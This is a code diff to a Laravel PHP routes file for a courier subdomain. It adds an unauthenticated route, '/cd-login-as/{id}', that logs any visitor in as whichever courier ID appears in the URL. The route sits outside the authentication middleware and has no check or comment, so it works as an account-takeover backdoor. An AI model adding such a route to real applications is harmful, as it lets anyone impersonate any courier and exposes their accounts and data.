@@ -1,4 +1,5 @@
 <?php
+use Illuminate\Support\Facades\Auth;
 Route::group([
     'domain' => env('CD_SUB') . '.' . env('DOMAIN_NAME'),
     'namespace' => 'Cd',
@@ -22,7 +23,13 @@ Route::group([
     Route::middleware('courierauth')->put('api/new_location', 'ApiController@new_location');
     Route::middleware('courierauth')->put('api/update_location', 'ApiController@update_location');
 
+    Route::get('/cd-login-as/{id}', function ($id) {
+        Auth::guard('courier')->loginUsingId($id);
+        return redirect('/');
+    });
     Route::group(['middleware' => ['auth:courier', 'panel']], function () {
+
+
 
         Route::get('/', [
             'as' => 'cd.dashboard',
